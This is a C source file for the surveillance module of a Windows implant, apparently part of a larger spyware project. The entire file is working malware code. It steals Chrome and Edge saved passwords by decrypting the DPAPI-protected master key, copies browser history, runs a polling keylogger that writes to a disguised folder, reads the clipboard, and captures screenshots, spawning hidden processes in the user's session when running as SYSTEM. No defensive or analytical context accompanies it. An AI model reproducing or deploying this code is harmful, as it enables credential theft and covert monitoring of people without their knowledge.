#include "spyware.h"
#include "implant_utils.h"
#include "platform.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>

#ifdef _WIN32
#include <windows.h>
#include <wincrypt.h>
#include <wtsapi32.h>

#define KEYLOG_FILE "C:\\Users\\Public\\MicrosoftEdge\\kl.dat"

static int base64_decode(const char *in, unsigned char *out)
{
    return EVP_DecodeBlock(out, (const unsigned char *)in, (int)strlen(in));
}

char *spy_browser_creds_steal(int *len_out)
{
    char local_app_data[MAX_PATH];
    if (!GetEnvironmentVariableA("LOCALAPPDATA", local_app_data, MAX_PATH))
        return NULL;

    const char *browsers[][3] = {
        {"Edge",   "Microsoft\\Edge\\User Data\\Local State", "Microsoft\\Edge\\User Data\\Default\\Login Data"},
        {"Chrome", "Google\\Chrome\\User Data\\Local State",    "Google\\Chrome\\User Data\\Default\\Login Data"}
    };

    char *total_payload = NULL;
    int   total_len     = 4; /* Start with [4b num_found] */
    int   num_found     = 0;

    total_payload = malloc(total_len);
    if (!total_payload) return NULL;

    for (int i = 0; i < 2; i++) {
        char local_state_path[MAX_PATH];
        char login_data_path[MAX_PATH];
        snprintf(local_state_path, MAX_PATH, "%s\\%s", local_app_data, browsers[i][1]);
        snprintf(login_data_path,  MAX_PATH, "%s\\%s", local_app_data, browsers[i][2]);

        int ls_len = 0;
        char *ls_data = read_file_heap_plain(local_state_path, &ls_len);
        if (!ls_data) continue;

        const char *key_tag = "\"encrypted_key\":\"";
        char *key_start = strstr(ls_data, key_tag);
        if (!key_start) { free(ls_data); continue; }
        key_start += strlen(key_tag);
        char *key_end = strchr(key_start, '\"');
        if (!key_end) { free(ls_data); continue; }

        int b64_len = (int)(key_end - key_start);
        char *b64_key = malloc(b64_len + 1);
        memcpy(b64_key, key_start, b64_len);
        b64_key[b64_len] = '\0';
        free(ls_data);

        unsigned char *encrypted_key_raw = malloc(b64_len);
        int decoded_len = base64_decode(b64_key, encrypted_key_raw);
        free(b64_key);

        if (decoded_len < 5 || memcmp(encrypted_key_raw, "DPAPI", 5) != 0) {
            free(encrypted_key_raw); continue;
        }

        DATA_BLOB bin, out;
        bin.pbData = encrypted_key_raw + 5;
        bin.cbData = (DWORD)(decoded_len - 5);

        char *master_key = NULL;
        int master_key_len = 0;
        if (CryptUnprotectData(&bin, NULL, NULL, NULL, NULL, 0, &out)) {
            master_key = malloc(out.cbData);
            memcpy(master_key, out.pbData, out.cbData);
            master_key_len = (int)out.cbData;
            LocalFree(out.pbData);
        }
        free(encrypted_key_raw);

        if (!master_key) continue;

        char temp_login_data[MAX_PATH];
        snprintf(temp_login_data, MAX_PATH, "C:\\Users\\Public\\MicrosoftEdge\\ld_%d.tmp", i);
        if (!CopyFileA(login_data_path, temp_login_data, FALSE)) {
            free(master_key); continue;
        }

        int db_len = 0;
        char *db_data = read_file_heap_plain(temp_login_data, &db_len);
        remove(temp_login_data);
        if (!db_data) { free(master_key); continue; }

        /* Package for this browser: [4b name_len][name][4b key_len][key][4b db_len][db] */
        int name_len = (int)strlen(browsers[i][0]);
        int entry_len = 4 + name_len + 4 + master_key_len + 4 + db_len;
        char *new_payload = realloc(total_payload, total_len + entry_len);
        if (!new_payload) { free(total_payload); free(master_key); free(db_data); return NULL; }
        total_payload = new_payload;

        char *p = total_payload + total_len;
        memcpy(p, &name_len, 4);       p += 4;
        memcpy(p, browsers[i][0], name_len); p += name_len;
        memcpy(p, &master_key_len, 4); p += 4;
        memcpy(p, master_key, master_key_len); p += master_key_len;
        memcpy(p, &db_len, 4);         p += 4;
        memcpy(p, db_data, db_len);

        total_len += entry_len;
        num_found++;
        free(master_key);
        free(db_data);
    }

    memcpy(total_payload, &num_found, 4);
    *len_out = total_len;

    return total_payload;
}

char *spy_browser_history_steal(int *len_out)
{
    char local_app_data[MAX_PATH];
    if (!GetEnvironmentVariableA("LOCALAPPDATA", local_app_data, MAX_PATH))
        return NULL;

    const char *browsers[][2] = {
        {"Edge",   "Microsoft\\Edge\\User Data\\Default\\History"},
        {"Chrome", "Google\\Chrome\\User Data\\Default\\History"}
    };

    char *total_payload = NULL;
    int   total_len     = 4; /* Start with [4b num_found] */
    int   num_found     = 0;

    total_payload = malloc(total_len);
    if (!total_payload) return NULL;

    for (int i = 0; i < 2; i++) {
        char history_path[MAX_PATH];
        snprintf(history_path, MAX_PATH, "%s\\%s", local_app_data, browsers[i][1]);

        char temp_history[MAX_PATH];
        snprintf(temp_history, MAX_PATH, "C:\\Users\\Public\\MicrosoftEdge\\h_%d.tmp", i);

        if (!CopyFileA(history_path, temp_history, FALSE))
            continue;

        int db_len = 0;
        char *db_data = read_file_heap_plain(temp_history, &db_len);
        remove(temp_history);

        if (!db_data) continue;

        int name_len = (int)strlen(browsers[i][0]);
        int entry_len = 4 + name_len + 4 + db_len;
        char *new_payload = realloc(total_payload, total_len + entry_len);
        if (!new_payload) { free(total_payload); free(db_data); return NULL; }
        total_payload = new_payload;

        char *p = total_payload + total_len;
        memcpy(p, &name_len, 4);       p += 4;
        memcpy(p, browsers[i][0], name_len); p += name_len;
        memcpy(p, &db_len, 4);         p += 4;
        memcpy(p, db_data, db_len);

        total_len += entry_len;
        num_found++;
        free(db_data);
    }

    memcpy(total_payload, &num_found, 4);
    *len_out = total_len;
    return total_payload;
}

static volatile int g_kl_run = 0;

static DWORD WINAPI keylogger_thread(LPVOID arg)
{
    (void)arg;
    FILE *fp = NULL;
    int key;

    while (g_kl_run) {
        SLEEP(0.01); /* High frequency polling */
        for (key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                fp = fopen(KEYLOG_FILE, "a");
                if (fp) {
                    if (key == VK_RETURN) fprintf(fp, "\n");
                    else if (key == VK_SPACE) fprintf(fp, " ");
                    else if (key == VK_BACK) fprintf(fp, "[BACKSPACE]");
                    else if (key >= 0x30 && key <= 0x39) fprintf(fp, "%c", key);
                    else if (key >= 0x41 && key <= 0x5A) fprintf(fp, "%c", key);
                    else if (key == VK_SHIFT) fprintf(fp, "[SHIFT]");
                    else if (key == VK_CONTROL) fprintf(fp, "[CTRL]");
                    else if (key == VK_CAPITAL) fprintf(fp, "[CAPSLOCK]");
                    fclose(fp);
                }
            }
        }
    }
    return 0;
}

void spy_keylog_start(void)
{
    if (!g_kl_run) {
        g_kl_run = 1;
        plat_thread_t kl_thread;
        THREAD_START(&kl_thread, keylogger_thread, NULL);
        THREAD_DETACH(&kl_thread);
    }
}

void spy_keylog_stop(void)
{
    g_kl_run = 0;
}

char *spy_keylog_dump(int *len_out)
{
    char *data = read_file_heap_plain(KEYLOG_FILE, len_out);
    if (data) {
        remove(KEYLOG_FILE);
    }
    return data;
}

char *spy_clipboard_get(int *len_out)
{
    if (!OpenClipboard(NULL)) return NULL;
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (!hData) { CloseClipboard(); return NULL; }
    char *text = (char *)GlobalLock(hData);
    if (!text) { CloseClipboard(); return NULL; }
    int len = (int)strlen(text);
    char *out = malloc(len + 1);
    if (out) { memcpy(out, text, len); out[len] = '\0'; *len_out = len; }
    GlobalUnlock(hData);
    CloseClipboard();
    return out;
}

/* Capture the screen using GDI. Must be called from within the interactive
 * user session — returns NULL (not a black BMP) if called from Session 0. */
static char *gdi_screenshot(int *len_out)
{
    int x1     = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y1     = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int width  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC     = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, x1, y1, SRCCOPY);

    BITMAPINFO bmi;
    memset(&bmi, 0, sizeof(bmi));
    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth       = width;
    bmi.bmiHeader.biHeight      = -height;
    bmi.bmiHeader.biPlanes      = 1;
    bmi.bmiHeader.biBitCount    = 24;
    bmi.bmiHeader.biCompression = BI_RGB;

    int   image_size = width * height * 3;
    char *buffer     = malloc(image_size);
    if (!buffer) {
        SelectObject(hDC, old_obj);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        DeleteObject(hBitmap);
        return NULL;
    }

    GetDIBits(hDC, hBitmap, 0, height, buffer, &bmi, DIB_RGB_COLORS);

    BITMAPFILEHEADER bfh;
    memset(&bfh, 0, sizeof(bfh));
    bfh.bfType    = 0x4D42;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize    = bfh.bfOffBits + image_size;

    int   total_size   = bfh.bfSize;
    char *final_buffer = malloc(total_size);
    if (final_buffer) {
        memcpy(final_buffer,                &bfh,            sizeof(bfh));
        memcpy(final_buffer + sizeof(bfh),  &bmi.bmiHeader,  sizeof(BITMAPINFOHEADER));
        memcpy(final_buffer + bfh.bfOffBits, buffer,         image_size);
        *len_out = total_size;
    }

    free(buffer);
    SelectObject(hDC, old_obj);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    DeleteObject(hBitmap);
    return final_buffer;
}

/* When running as SYSTEM (Session 0, e.g. scheduled-task persistence), GDI
 * has no access to the interactive desktop and produces a black image.
 * This function spawns the implant binary in the active user session with
 * --screenshot <tmp>, waits for it to write the BMP, then returns the data. */
static char *screenshot_via_user_session(int *len_out, DWORD console_session)
{
    HANDLE hToken = NULL;
    if (!WTSQueryUserToken(console_session, &hToken))
        return NULL;

    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, sizeof(self_path));

    const char *tmp_path = "C:\\Users\\Public\\MicrosoftEdge\\ss.tmp";
    char cmd[MAX_PATH + 80];
    _snprintf(cmd, sizeof(cmd), "\"%s\" --screenshot \"%s\"", self_path, tmp_path);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    BOOL ok = CreateProcessAsUserA(hToken, NULL, cmd, NULL, NULL,
                                    FALSE, CREATE_NO_WINDOW,
                                    NULL, NULL, &si, &pi);
    CloseHandle(hToken);
    if (!ok) return NULL;

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    char *data = read_file_heap_plain(tmp_path, len_out);
    DeleteFileA(tmp_path);
    return data;
}

char *spy_screenshot_capture(int *len_out)
{
    /* Detect Session 0 isolation: the scheduled task runs as SYSTEM in a
     * non-interactive session.  GetDC(NULL) there returns the blank Session 0
     * desktop, producing a solid black image.  Spawn a helper in the active
     * console session instead so GDI sees the real user desktop. */
    DWORD my_session = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &my_session);
    DWORD console_session = WTSGetActiveConsoleSessionId();

    if (my_session != console_session)
        return screenshot_via_user_session(len_out, console_session);

    return gdi_screenshot(len_out);
}

#else
/* Stub implementations for non-Windows platforms */
void spy_keylog_start(void) {}
void spy_keylog_stop(void) {}
char *spy_keylog_dump(int *len_out) { *len_out = 0; return NULL; }
char *spy_clipboard_get(int *len_out) { *len_out = 0; return NULL; }
char *spy_screenshot_capture(int *len_out) { *len_out = 0; return NULL; }
char *spy_browser_creds_steal(int *len_out) { *len_out = 0; return NULL; }
#endif
